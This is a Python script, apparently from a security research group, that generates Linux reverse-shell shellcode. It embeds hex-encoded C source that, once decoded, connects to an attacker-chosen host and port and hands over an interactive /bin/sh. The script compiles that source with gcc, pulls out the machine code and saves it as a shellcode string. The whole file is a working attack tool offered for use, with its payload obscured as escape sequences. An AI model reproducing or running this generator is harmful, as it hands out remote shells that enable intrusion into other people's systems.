#!/usr/bin/python3
# Shellcode Reverse Shell Linux Generator
# R&D ICWR - Afrizal F.A
# Reverse Shell C Code Source : https://github.com/arturgontijo/remoteShell

print("""
  /$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$  /$$          /$$$$$$ 
 /$$__  $$ /$$__  $$| $$__  $$ /$$__  $$| $$         /$$__  $$
| $$  \__/| $$  \__/| $$  \ $$| $$  \__/| $$        | $$  \__/
|  $$$$$$ | $$      | $$$$$$$/|  $$$$$$ | $$ /$$$$$$| $$ /$$$$
 \____  $$| $$      | $$__  $$ \____  $$| $$|______/| $$|_  $$
 /$$  \ $$| $$    $$| $$  \ $$ /$$  \ $$| $$        | $$  \ $$
|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$  |  $$$$$$/
 \______/  \______/ |__/  |__/ \______/ |________/   \______/ 
==============================================================
[*] Shellcode Reverse Shell Linux - Generator | R&D ICWR
==============================================================
""")

import os, sys

class shellcode_rsl:

    def make_sc(self, host, port, file_name):

        try:

            source = "\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x74\x64\x69\x6f\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x75\x6e\x69\x73\x74\x64\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x79\x73\x2f\x73\x6f\x63\x6b\x65\x74\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x61\x72\x70\x61\x2f\x69\x6e\x65\x74\x2e\x68\x3e\x0a\x20\x0a\x69\x6e\x74\x20\x6d\x61\x69\x6e\x20\x28\x69\x6e\x74\x20\x61\x72\x67\x63\x2c\x20\x63\x68\x61\x72\x20\x2a\x2a\x61\x72\x67\x76\x29\x0a\x7b\x0a\x0a\x09\x69\x6e\x74\x20\x73\x63\x6b\x74\x64\x3b\x0a\x09\x73\x74\x72\x75\x63\x74\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x5f\x69\x6e\x20\x63\x6c\x69\x65\x6e\x74\x3b\x0a\x09\x63\x6c\x69\x65\x6e\x74\x2e\x73\x69\x6e\x5f\x66\x61\x6d\x69\x6c\x79\x20\x3d\x20\x41\x46\x5f\x49\x4e\x45\x54\x3b\x0a\x09\x63\x6c\x69\x65\x6e\x74\x2e\x73\x69\x6e\x5f\x61\x64\x64\x72\x2e\x73\x5f\x61\x64\x64\x72\x20\x3d\x20\x69\x6e\x65\x74\x5f\x61\x64\x64\x72\x28\x22" + host + "\x22\x29\x3b\x0a\x09\x63\x6c\x69\x65\x6e\x74\x2e\x73\x69\x6e\x5f\x70\x6f\x72\x74\x20\x3d\x20\x68\x74\x6f\x6e\x73\x28" + port + "\x29\x3b\x0a\x09\x73\x63\x6b\x74\x64\x20\x3d\x20\x73\x6f\x63\x6b\x65\x74\x28\x41\x46\x5f\x49\x4e\x45\x54\x2c\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x2c\x30\x29\x3b\x0a\x09\x63\x6f\x6e\x6e\x65\x63\x74\x28\x73\x63\x6b\x74\x64\x2c\x28\x73\x74\x72\x75\x63\x74\x20\x73\x6f\x63\x6b\x61\x64\x64\x72\x20\x2a\x29\x26\x63\x6c\x69\x65\x6e\x74\x2c\x73\x69\x7a\x65\x6f\x66\x28\x63\x6c\x69\x65\x6e\x74\x29\x29\x3b\x0a\x09\x64\x75\x70\x32\x28\x73\x63\x6b\x74\x64\x2c\x30\x29\x3b\x0a\x09\x64\x75\x70\x32\x28\x73\x63\x6b\x74\x64\x2c\x31\x29\x3b\x0a\x09\x64\x75\x70\x32\x28\x73\x63\x6b\x74\x64\x2c\x32\x29\x3b\x0a\x09\x65\x78\x65\x63\x6c\x28\x22\x2f\x62\x69\x6e\x2f\x73\x68\x22\x2c\x22\x73\x68\x22\x2c\x22\x2d\x69\x22\x2c\x4e\x55\x4c\x4c\x2c\x4e\x55\x4c\x4c\x29\x3b\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x0a\x7d"
            f = open("tmp-c-scrslg.c", "w")
            f.write(source)
            f.close()
            os.system("gcc tmp-c-scrslg.c -o tmp-c-scrslg")
            os.remove("tmp-c-scrslg.c")
            os.system("objcopy -O binary -j .text tmp-c-scrslg tmp-hex-scrslg")
            os.remove("tmp-c-scrslg")
            os.system("od -An -t x1 tmp-hex-scrslg > tmp-hex")
            os.remove("tmp-hex-scrslg")

            string_shellcode = ''

            for x in open("tmp-hex", "r").read().replace("\n", "").split(" "):

                if x != "":

                    string_shellcode += "\\x" + x

            os.remove("tmp-hex")
            f = open(file_name, "w")

            if f.write(string_shellcode):

                return True

            else:

                return False

            f.close()

        except:

            return False

    def __init__(self):

        host = input("[*] HOST -> ")
        port = input("[*] PORT -> ")
        file_name = input("[*] Save File -> ")
        print("[*] Generating Shellcode")
        print("[*] Reverse Host -> {}:{}".format(host, port))
        print("[*] Generating File")

        if self.make_sc(host, port, file_name) == True:

            print("[+] Success Save File -> {}".format(file_name))

        else:

            print("[-] Failed Save File -> {}".format(file_name))

if __name__ == "__main__":

    shellcode_rsl()
